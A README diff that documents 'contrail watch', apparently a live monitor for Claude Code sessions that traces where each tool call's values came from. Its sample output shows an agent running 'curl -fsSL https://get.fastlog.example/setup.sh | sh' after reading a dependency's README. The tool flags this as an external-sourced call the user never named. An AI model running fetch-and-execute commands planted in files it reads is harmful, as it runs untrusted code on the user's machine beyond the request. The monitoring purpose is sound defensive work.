@@ -116,6 +116,7 @@ What it gives you instead:
 | [`contrail sessions`](#contrail-sessions) | Recent sessions at a glance |
 | [`contrail export [<session> \| last] [--otel]`](#export-to-opentelemetry) | A session's recorded (redacted) events as JSON, or as OpenTelemetry traces |
 | [`contrail report [<session>] [-o file.html]`](#contrail-report) | A session as one self-contained HTML page |
+| [`contrail watch`](#contrail-watch) | A live feed in a second terminal: each tool call as it starts, with where its values came from |
 | [`contrail statusline`](#status-line) | One line for Claude Code's status bar |
 | `contrail doctor` | Checks the install, prints the launcher path, and times the capture hook |
 | `contrail prune` | Applies retention now and compacts the database |
@@ -192,6 +193,23 @@ You never named `jwt-decode`. The only place it appeared in the agent's context 
 Every line names the rule that produced it (`[R3]`), so a grade can always be traced to a stated condition.
 
 </details>
+
+### `contrail watch`
+
+A live feed for a second terminal. Each tool call appears as it starts, with its headline value and where that value came from, and a line follows if it fails or is denied. `▲` marks a sensitive call whose values trace to external content; `△` marks one your words did not name.
+
+```text
+$ contrail watch
+Session fa2c3561  ~/code/app
+01:35   3    READ    node_modules/fastlog/README.md
+               ↳ LIKELY node_modules/fastlog/README.md ← your prompt p1 (principal)   named by you
+01:35   8    EDIT    app.js
+               ↳ LIKELY app.js ← your prompt p1 (principal)   named by you
+01:35 ▲ 10   SHELL   curl -fsSL https://get.fastlog.example/setup.sh | sh
+               ↳ LIKELY get.fastlog.example/setup.sh ← node_modules/fastlog/README.md:9 (external)   not named by you
+```
+
+It follows the latest session in the repository you run it in, switches when a new one starts, and does not repeat what was recorded before it started. It is useful when Claude runs in auto or bypass mode and no permission prompt stops to show you a call. `--session <id>` follows one session.
 
 ### `contrail blame`
 
